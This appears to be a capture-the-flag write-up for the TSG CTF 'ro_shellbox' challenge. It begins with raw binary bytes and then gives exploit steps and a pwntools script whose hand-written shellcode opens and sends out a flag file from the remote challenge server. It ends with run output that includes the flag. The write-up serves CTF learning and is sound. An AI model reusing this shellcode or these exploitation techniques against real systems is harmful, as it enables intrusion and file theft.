\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00 \x00\x08ro_shellbox\x00\x00\x00\x00\x00\x00@\x008\x00\x0e\x00@\x00B\x00A\x00\x06\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x04\x00\x00\x00\x00\x00\x00\x10\x03\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x000>\x1e\x00\x00\x00\x00\x000>\x1e\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00A\x00\x00\x00@\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00\x00\x00w\x00\x00\x00n\x00\x00\x00]\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00 ~:\xa5\xfc\x7f\x00\x00t~:\xa5\xfc\x7f\x00\x00\x00\xd2v߳\x8a\x05\xc8 ~:\xa5\xfc\x7f\x00\x001\xedM1\xf6M1\xffC\xc0\x02r\x9aZ\x00\x00 ~:\xa5\xfc\x7f\x00\x000\xdd\x02r\x9aZ\x00\x00@е\x0c\x99~\x00\x00\x10t:\xa5\xfc\x7f\x00\x00b3\x95\x0c\x99~\x00\x00\xa0\xc2ì\x9aZ\x00\x00\x10\x00\x00\x000\x00\x00\x00\xe0u:\xa5\xfc\x7f\x00\x00\x10u:\xa5\xfc\x7f\x00\x00\x01\x80\xad\xfb\x00\x00\x00\x00F~:\xa5\xfc\x7f\x00\x00t~:\xa5\xfc\x7f\x00\x00timeout: the monitored command dumped core
"""
```

- leak flag content
1. calculate environ address from libc address of $xmm0
2. set rsp, rbp
3. set fs_base
4. calculate binary address
5. open "flag-528f44c64deac370831edc02aa79f7b5.txt" -> since fd 0 has been closed, fd 0 will be reused 
6. sendfile to stdout

```py
from pwn import *
from icecream import ic
import sys
import re
import inspect

e = ELF("ro_shellbox_patched",checksec=False)
libc = ELF("libc.so.6",checksec=False)
ld = ELF("ld-linux-x86-64.so.2",checksec=False)

nc = "nc 35.194.98.181 42324"
#nc = "nc localhost 42324"

if "nc" in nc:
    HOST = nc.split(" ")[1]
    PORT = int(nc.split(" ")[2])
if "http" in nc:
    from urllib.parse import urlparse
    HOST = urlparse(nc).hostname
    PORT = urlparse(nc).port

dbg = 1
g_script = """
    #set max-visualize-chunk-size 0x300
    b *main+829
    b *safe_box+627
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sln  = lambda b: io.sendline(str(b).encode())
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv()
ru  = lambda b:io.recvuntil(b)
rl  = lambda : io.recvline()
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
fsp = lambda b : f"%{b}$p".encode()
shell = lambda : io.interactive()

def hl(v: int): print(f"{(m := re.search(r'hl\s*\(\s*(.+?)\s*\)', inspect.getframeinfo(inspect.currentframe().f_back).code_context[0].strip())) and m.group(1) or '?'}: {hex(v)}")

payload = b""
def rst():global payload;payload = b"";log.info("***PAYLOAD RESET***")
def pay(*args, **kwargs): global payload; payload += b"".join([a if type(a) == bytes else (a.encode() if type(a) == str else p64(a)) for a in args])

ru(b"input:")

dosyscall = asm("""
mov dword ptr [rbp-0x940],0x0
call rbx
""")

#shellcode = asm(f"""
#test rax, rax
#jz $+0x3
#ret
#vmovq rsp, xmm0
#mov rbx, [rsp+{0x5dd3b9e73880-0x5dd3b9e732a0}]
#add rbx, {0x222200-0x2170c0}
#mov rbx, [rbx]
#mov rsp, rbx
#sub rbx, 0x30
#mov rbx, [rbx]
#sub rbx, {0x00005dd383b882c5-0x00005dd383b87000}
#add rbx, 0x000018be
#sub rsp, 0x100
#mov rbp,rsp
#sub rsp, 0x2000
#""")

shellcode = asm(f"""
test rax, rax
jz $+0x3
ret
vmovq rsp, xmm0
mov rbx, rsp
add rbx, {27133}
mov rbx, [rbx]
mov rsp, rbx
sub rbx, 0x30
mov rbx, [rbx]
sub rbx, {0x00005dd383b882c5-0x00005dd383b87000}
add rbx, 0x000018be
sub rsp, 0x100
mov rbp,rsp
sub rsp, 0x2000
""")

shellcode += asm("""
mov rax, rbp
mov r13, rbp
sub rax, 0x30
call $-80
""")

# open("flag-528f44c64deac370831edc02aa79f7b5.txt", O_RDONLY, 0)
shellcode += asm("""
call $+0x5
pop r12
add r12, 0x78
mov rax, 0x0
push rax 
push rax 
mov rax, 116
push rax 
mov rax, 0x78742e3562376639
push rax
mov rax, 0x3761613230636465
push rax
mov rax, 0x3133383037336361
push rax
mov rax, 0x6564343663343466
push rax
mov rax, 0x3832352d67616c66
push rax
xor rax, rax
mov rax, 2
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov qword ptr [rbp+0x8], r12
""")
shellcode += dosyscall
shellcode += asm("""
nop                 
nop                 
nop                 
nop                 
nop                 
nop                 
nop                 
nop                 
nop                 
nop                 
nop                 
nop                 
nop                 
nop                 
nop                 
nop                 
nop                 
nop                 
nop                 
""")

# sendfile(1,0,0,0x100)
shellcode += asm("""
mov rdi, 1
mov rsi, 0
mov rdx, 0
mov r10, 0x100
mov rax, 40
""")
shellcode += dosyscall

for i in range(len(shellcode)//16):
    print(hex(u64(shellcode[16*i:16*i+8])),hex(u64(shellcode[16*i+8:16*i+16])))

with open("output_exp","wb") as fd:
    fd.write(shellcode)

input("hlt")
sl(shellcode)
io.shutdown("send")

shell()

"""
[~/dc/ctf/tsg/ro_shellbox]$python3 e2.py r
[+] Opening connection to 35.194.98.181 on port 42324: Done
0xe1c4c30174c08548 0x8148e38948c47ef9
0x1b8b48000069fdc3 0x4830eb8348dc8948
0x12c5eb81481b8b 0x18bec3814800
0x4800000100ec8148 0x2000ec8148e589
0x48ed8949e8894800 0xffffffabe830e883
0x495c4100000000e8 0xc0c74878c483
0x74c0c74850500000 0x6639b84850000000
0x485078742e356237 0x61613230636465b8
0x37336361b8485037 0x66b8485031333830
0x5065643436633434 0x352d67616c66b848
0xc748c03148503832 0xe7894800000002c0
0x894cd23148f63148 0xfffff6c085c70865
0x9090d3ff00000000 0x9090909090909090
0x9090909090909090 0x1c7c74890
0x4800000000c6c748 0xc74900000000c2c7
0xc0c74800000100c2 0xf6c085c700000028
hlt
[*] Switching to interactive mode

Safe Input!
Secure the Shellbox
TSGCTF{y0u_ar3_a_r0_5h3llbox_35cap1st!}
timeout: the monitored command dumped core
Segmentation fault

"""
```
